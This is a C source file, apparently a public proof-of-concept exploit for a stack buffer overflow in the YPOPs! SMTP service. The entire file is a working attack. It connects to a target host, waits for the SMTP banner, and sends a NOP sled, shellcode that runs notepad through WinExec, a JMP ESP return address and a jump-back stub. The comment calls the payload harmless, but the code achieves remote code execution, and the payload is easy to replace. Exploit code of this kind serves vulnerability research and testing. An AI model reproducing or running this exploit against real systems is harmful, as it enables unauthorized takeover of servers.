#include <stdio.h>
#include <string.h>
#include <windows.h>
#include <winsock.h>

#pragma comment(lib,"wsock32.lib")

int main(int argc, char *argv[])
{
static char overflow[1024];

char ret_code[]="\x23\x9b\x02\x10"; //JMP ESP - libcurl.dll
char jump_back[]="\x89\xe3\x66\x81\xeb\xfb\x01\xff\xe3";


/*- harmless code (tnx to snooq) , will open  notepad on the remote machine */
char code[]= "\x33\xc0" // xor eax, eax  slight modification to move esp up
 "\xb0\xf0"             // mov al, 0f0h
 "\x2b\xe0"             // sub esp,eax
 "\x83\xE4\xF0" // and esp, 0FFFFFFF0h
 "\x55" // push ebp
 "\x8b\xec" // mov ebp, esp
 "\x33\xf6" // xor esi, esi
 "\x56" // push esi
 "\x68\x2e\x65\x78\x65" // push 'exe.'
 "\x68\x65\x70\x61\x64" // push 'dape'
 "\x68\x90\x6e\x6f\x74" // push 'ton'
 "\x46" // inc esi
 "\x56" // push esi
 "\x8d\x7d\xf1" // lea edi, [ebp-0xf]
 "\x57" // push edi
 "\xb8\x35\xfd\xe6\x77" // mov eax,XXXX -> WinExec()win2k(SP4)=0x7c4e9c1d
 "\xff\xd0" // call eax
 "\x4e" // dec esi
 "\x56" // push esi
 "\xb8\xfd\x98\xe7\x77" // mov eax,YYYY ->ExitProcess()win2k(SP4)0x7c4ee01a
 "\xff\xd0"; // call eax



   WSADATA wsaData;


   struct hostent *hp;
   struct sockaddr_in sockin;
   char buf[300], *check;
   int sockfd, bytes;
   int plen,i;
   char *hostname;
   unsigned short port;

  if (argc <= 1)
   {
          printf("YPOPs! SMTP Overflow\n");
          printf("By: Behrang Fouladi(behrang@hat-squad.com)\n\n");
      printf("Usage: %s [hostname] [port]\n", argv[0]);
      printf("default port is 25 \n");

      exit(0);
   }

   printf("YPOPs! SMTP Overflow\n");
   printf("By: Behrang Fouladi(behrang@hat-squad.com)\n\n");

   hostname = argv[1];
   if (argv[2]) port = atoi(argv[2]);
   else port = atoi("25");



   if (WSAStartup(MAKEWORD(1, 1), &wsaData) < 0)
   {
      fprintf(stderr, "Error setting up with WinSock v1.1\n");
      exit(-1);
   }


   hp = gethostbyname(hostname);
   if (hp == NULL)
   {
      printf("ERROR: Uknown host %s\n", hostname);
          printf("%s",hostname);
      exit(-1);
   }

   sockin.sin_family = hp->h_addrtype;
   sockin.sin_port = htons(port);
   sockin.sin_addr = *((struct in_addr *)hp->h_addr);

   if ((sockfd = socket(AF_INET, SOCK_STREAM, 0)) == SOCKET_ERROR)
   {
      printf("ERROR: Socket Error\n");
      exit(-1);
   }

   if ((connect(sockfd, (struct sockaddr *) &sockin,
                sizeof(sockin))) == SOCKET_ERROR)
   {
      printf("ERROR: Connect Error\n");
      closesocket(sockfd);
      WSACleanup();
      exit(-1);
   }

   printf("Connected to [%s] on port [%d], sending overflow....\n",
          hostname, port);


   if ((bytes = recv(sockfd, buf, 300, 0)) == SOCKET_ERROR)
   {
      printf("ERROR: Recv Error\n");
      closesocket(sockfd);
      WSACleanup();
      exit(1);
   }

   /* wait for SMTP service welcome*/
   buf[bytes] = '\0';
   check = strstr(buf, "220");
   if (check == NULL)
   {
      printf("ERROR: NO  response from SMTP service\n");
      closesocket(sockfd);
      WSACleanup();
      exit(-1);
   }

 plen=504-sizeof(code);
   memset(overflow,0,sizeof(overflow));

   for (i=0; i<plen;i++){strcat(overflow,"\x90");}

   strcat(overflow,code);
   strcat(overflow,ret_code);
   strcat(overflow,jump_back);
   strcat(overflow,"\n");

   if (send(sockfd, overflow, strlen(overflow),0) == SOCKET_ERROR)
   {
      printf("ERROR: Send Error\n");
      closesocket(sockfd);
      WSACleanup();
      exit(-1);
   }

   printf("Exploit Sent.\n");

   closesocket(sockfd);
   WSACleanup();
   return 0;
}
